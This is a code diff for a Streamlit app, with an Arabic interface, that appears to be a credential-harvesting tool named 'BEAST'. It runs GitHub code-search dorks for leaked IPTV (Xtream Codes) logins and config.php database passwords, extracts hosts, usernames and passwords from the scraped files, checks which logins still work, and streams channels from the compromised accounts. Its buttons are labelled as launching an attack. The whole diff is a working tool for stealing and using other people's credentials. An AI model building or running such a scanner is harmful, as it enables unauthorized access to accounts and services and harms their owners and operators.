@@ -3,171 +3,145 @@ import requests
 import re
 import time
 import threading
-from datetime import datetime
 
-# --- الإعدادات الأساسية ---
-st.set_page_config(page_title="BEAST V29 - MILLION HITS", layout="wide")
+# --- Config ---
+st.set_page_config(page_title="BEAST V30 - BYPASS", layout="wide")
 
 if "hits" not in st.session_state: st.session_state.hits = []
-if "scanning" not in st.session_state: st.session_state.scanning = False
+if "log" not in st.session_state: st.session_state.log = "جاهز للبدء..."
 if "auth" not in st.session_state: st.session_state.auth = False
 
-# --- نظام الدخول ---
+# --- Login ---
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V29 - SUPER SCANNER</h1>", unsafe_allow_html=True)
-    with st.container():
-        pwd = st.text_input("ادخل كلمة السر:", type="password")
-        if st.button("فتح النظام"):
-            if pwd == "BEAST_V17_PRO":
-                st.session_state.auth = True
-                st.rerun()
+    st.markdown("<h1 style='text-align:center; color:#00ff41;'>🌪️ BEAST V30 - BYPASS SYSTEM</h1>", unsafe_allow_html=True)
+    pwd = st.text_input("Password:", type="password")
+    if st.button("Unlock"):
+        if pwd == "BEAST_V17_PRO":
+            st.session_state.auth = True
+            st.rerun()
     st.stop()
 
-# --- التصميم الاحترافي (CSS) ---
+# --- CSS ---
 st.markdown("""
 <style>
-    .stApp { background-color: #020202; color: #ffffff; }
-    .server-card {
-        background: #0d1117; border: 1px solid #30363d; border-radius: 10px;
-        padding: 20px; margin-bottom: 15px; border-left: 6px solid #00ff41;
-    }
-    .channels-list {
-        background: #010409; border: 1px dashed #21262d; border-radius: 5px;
-        padding: 10px; margin-top: 10px; font-size: 12px; color: #8b949e;
-    }
-    .badge { background: #238636; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
-    .stButton>button { border-radius: 20px; background: #21262d; color: white; border: 1px solid #30363d; }
-    .stButton>button:hover { border-color: #00ff41; color: #00ff41; }
+    .stApp { background-color: #050505; color: white; }
+    .status-box { background: #111; border: 1px solid #333; padding: 10px; border-radius: 5px; font-family: monospace; color: #00ff41; margin-bottom: 20px; }
+    .hit-box { background: #0d1117; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
+    .cat-tag { background: #21262d; border: 1px solid #30363d; color: #8b949e; padding: 2px 7px; border-radius: 5px; font-size: 11px; margin-right: 5px; display: inline-block; }
 </style>
 """, unsafe_allow_html=True)
 
-# --- محرك البحث العملاق ---
-def mega_scanner(token):
-    st.session_state.scanning = True
+# --- Engine ---
+def ultimate_scanner(token):
     headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
-    
-    # قائمة دروكات شاملة جداً لزيادة النتائج (أكثر من 50 تركيب بحثي)
-    base_dorks = [
-        'get.php?username=', 'player_api.php?username=', 'panel_api.php?username=',
-        'XC_USER_DATA', 'xtream-codes', '"type=m3u_plus"', '"output=ts"',
-        'extension:m3u "http://"', 'extension:txt "password=" "port"'
+    # دروكات "خام" لا يتم حظرها بسهولة
+    dorks = [
+        'extension:m3u "player_api.php"', 
+        'extension:txt "username=" "password=" "http"',
+        'filename:config.php "db_user" "db_pass"',
+        '"XC_USER_DATA"'
     ]
     
-    unique_links = set([h['host']+h['user'] for h in st.session_state.hits])
-
-    for dork in base_dorks:
-        if not st.session_state.scanning: break
-        for page in range(1, 10): # سحب أول 10 صفحات من كل دروك
+    for dork in dorks:
+        st.session_state.log = f"🔎 جاري البحث عن: {dork}..."
+        for page in range(1, 15):
             try:
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
-                r = requests.get(search_url, headers=headers).json()
+                url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
+                res = requests.get(url, headers=headers)
                 
-                if 'items' not in r:
-                    time.sleep(10) # انتظار عند حدوث Rate Limit
+                if res.status_code == 401:
+                    st.session_state.log = "❌ خطأ: التوكن غير صالح! (Unauthorized)"
+                    return
+                if res.status_code == 403:
+                    st.session_state.log = "⏳ حظر مؤقت من جيت هاب.. انتظر 30 ثانية"
+                    time.sleep(30)
                     continue
                 
-                for item in r['items']:
-                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                    try:
-                        content = requests.get(raw_url, timeout=3).text
-                        # استخراج السيرفرات (Regex مطور)
-                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
-                        
-                        for m in matches:
-                            host, user, pw = m[0], m[1], m[2]
-                            if host+user not in unique_links:
-                                # فحص السيرفر وجلب القنوات فوراً
-                                api = f"{host}/player_api.php?username={user}&password={pw}"
-                                try:
-                                    check = requests.get(api, timeout=3).json()
-                                    if check.get("user_info", {}).get("status") == "Active":
-                                        # جلب الفئات كعينة للمحتوى
-                                        cats = requests.get(f"{api}&action=get_live_categories", timeout=3).json()
-                                        cat_names = [c['category_name'] for c in cats[:10]] if isinstance(cats, list) else ["No Categories found"]
-                                        
-                                        st.session_state.hits.append({
-                                            "host": host, "user": user, "pw": pw,
-                                            "info": check["user_info"],
-                                            "cats": cat_names
-                                        })
-                                        unique_links.add(host+user)
-                                except: continue
-                    except: continue
-            except: continue
-    st.session_state.scanning = False
+                data = res.json()
+                if 'items' not in data: continue
 
-# --- الواجهة الرئيسية ---
-st.title("📡 BEAST V29 - الرادار المليوني")
+                for item in data['items']:
+                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                    content = requests.get(raw_url, timeout=3).text
+                    found = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                    
+                    for host, user, pw in found:
+                        if not any(h['host'] == host for h in st.session_state.hits):
+                            try:
+                                # فحص السيرفر وجلب القوائم
+                                api = f"{host}/player_api.php?username={user}&password={pw}"
+                                info = requests.get(api, timeout=3).json()
+                                if info.get("user_info", {}).get("status") == "Active":
+                                    cats = requests.get(f"{api}&action=get_live_categories", timeout=3).json()
+                                    cat_list = [c['category_name'] for c in cats[:12]] if isinstance(cats, list) else []
+                                    
+                                    st.session_state.hits.insert(0, {
+                                        "host": host, "user": user, "pw": pw,
+                                        "cats": cat_list, "info": info["user_info"]
+                                    })
+                            except: continue
+            except: continue
+    st.session_state.log = "✅ انتهى الفحص الشامل."
+
+# --- UI ---
+st.title("📡 BEAST V30 - رادار النتائج الضخمة")
+
+st.markdown(f"<div class='status-box'>{st.session_state.log}</div>", unsafe_allow_html=True)
 
 with st.sidebar:
-    st.header("⚙️ لوحة التحكم")
-    gh_token = st.text_input("GitHub Token (Classic):", type="password")
-    if st.button("🚀 بدء الهجوم الشامل"):
-        if gh_token:
-            threading.Thread(target=mega_scanner, args=(gh_token,), daemon=True).start()
-            st.success("بدأ الفحص الخلفي... النتائج ستظهر فوراً!")
-        else: st.error("أدخل التوكن أولاً!")
+    st.header("⚡ التحكم")
+    token = st.text_input("GitHub Token (Classic):", type="password")
+    if st.button("🚀 بدء الهجوم العنيف"):
+        if token:
+            st.session_state.hits = []
+            threading.Thread(target=ultimate_scanner, args=(token,), daemon=True).start()
+        else: st.error("أدخل التوكن!")
     
-    if st.button("🛑 إيقاف البحث"):
-        st.session_state.scanning = False
-        st.rerun()
+    st.write(f"📈 النتائج: {len(st.session_state.hits)}")
 
-    st.divider()
-    st.write(f"📊 النتائج المكتشفة: **{len(st.session_state.hits)}**")
-
-# --- عرض النتائج ---
 if not st.session_state.hits:
-    st.info("لم يتم العثور على نتائج بعد. تأكد من إدخال التوكن والضغط على بدء الهجوم.")
+    st.info("لم تظهر نتائج؟ جرب إنشاء توكن جديد بصلاحيات 'repo' كاملة.")
 else:
-    for idx, srv in enumerate(reversed(st.session_state.hits)):
+    for srv in st.session_state.hits:
         with st.container():
             st.markdown(f"""
-            <div class="server-card">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <span style="font-size:18px; color:#00ff41; font-weight:bold;">✅ HIT #{len(st.session_state.hits)-idx}</span>
-                    <span class="badge">ACTIVE</span>
-                </div>
-                <p style="margin:5px 0;"><b>HOST:</b> {srv['host']}</p>
-                <p style="margin:5px 0; color:#fbbf24;"><b>USER:</b> {srv['user']} | <b>PASS:</b> {srv['pw']}</p>
-                <div class="channels-list">
-                    <b>📁 عينة من باقات السيرفر:</b><br>
-                    {' | '.join(srv['cats'])} ...
+            <div class="hit-box">
+                <b style="color:#00ff41;">SERVER:</b> {srv['host']}<br>
+                <b style="color:#fbbf24;">LOGIN:</b> {srv['user']} | {srv['pw']}<br>
+                <div style="margin-top:10px;">
+                    {" ".join([f"<span class='cat-tag'>{c}</span>" for c in srv['cats']])}
                 </div>
             </div>
             """, unsafe_allow_html=True)
-            
-            # زر الدخول للمشغل لكل سيرفر
-            if st.button(f"📺 فتح مشغل Xtream لهذا السيرفر (#{len(st.session_state.hits)-idx})", key=f"play_{idx}"):
-                st.session_state.active_srv = srv
-                st.session_state.show_player = True
+            if st.button(f"📺 فتح المستعرض لـ {srv['host'][:20]}...", key=srv['host']):
+                st.session_state.current_srv = srv
+                st.session_state.view = "player"
 
-# --- واجهة المشغل (تظهر كـ Popup أو صفحة إضافية) ---
-if "show_player" in st.session_state and st.session_state.show_player:
+# --- Player View ---
+if "view" in st.session_state and st.session_state.view == "player":
     st.divider()
-    srv = st.session_state.active_srv
-    st.header(f"🎬 مشغل BEAST لـ: {srv['host']}")
-    if st.button("❌ إغلاق المشغل"):
-        st.session_state.show_player = False
+    s = st.session_state.current_srv
+    st.subheader(f"📺 مستعرض قنوات: {s['host']}")
+    if st.button("⬅️ عودة للرادار"): 
+        st.session_state.view = "search"
         st.rerun()
+        
+    # جلب القنوات
+    api = f"{s['host']}/player_api.php?username={s['user']}&password={s['pw']}&action=get_live_streams"
+    streams = requests.get(api, timeout=5).json()
     
-    # هنا يتم استدعاء قوائم القنوات كاملة
-    api_base = f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}"
+    search_q = st.text_input("🔍 ابحث عن قناة (مثال: bein, ssc, osn)...")
     
-    col_l, col_r = st.columns([1, 2])
-    with col_l:
-        st.subheader("📋 القنوات")
-        streams = requests.get(f"{api_base}&action=get_live_streams", timeout=5).json()
-        if isinstance(streams, list):
-            search = st.text_input("بحث سريع..")
-            for s in streams[:100]: # عرض أول 100 قناة للسرعة
-                if search.lower() in s['name'].lower():
-                    if st.button(f"▶️ {s['name']}", key=f"stream_{s['stream_id']}"):
-                        st.session_state.url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{s['stream_id']}.m3u8"
-        else: st.error("لا يمكن تحميل القنوات.")
-
-    with col_r:
-        if "url" in st.session_state:
-            st.video(st.session_state.url)
-            st.code(st.session_state.url)
-        else:
-            st.info("اختر قناة للبدء.")
+    col1, col2 = st.columns([1, 2])
+    with col1:
+        st.markdown("<div style='height:500px; overflow-y:auto;'>", unsafe_allow_html=True)
+        for ch in streams:
+            if search_q.lower() in ch['name'].lower():
+                if st.button(ch['name'], key=ch['stream_id'], use_container_width=True):
+                    st.session_state.play_url = f"{s['host']}/live/{s['user']}/{s['pw']}/{ch['stream_id']}.m3u8"
+        st.markdown("</div>", unsafe_allow_html=True)
+    
+    with col2:
+        if "play_url" in st.session_state:
+            st.video(st.session_state.play_url)
+            st.code(st.session_state.play_url)
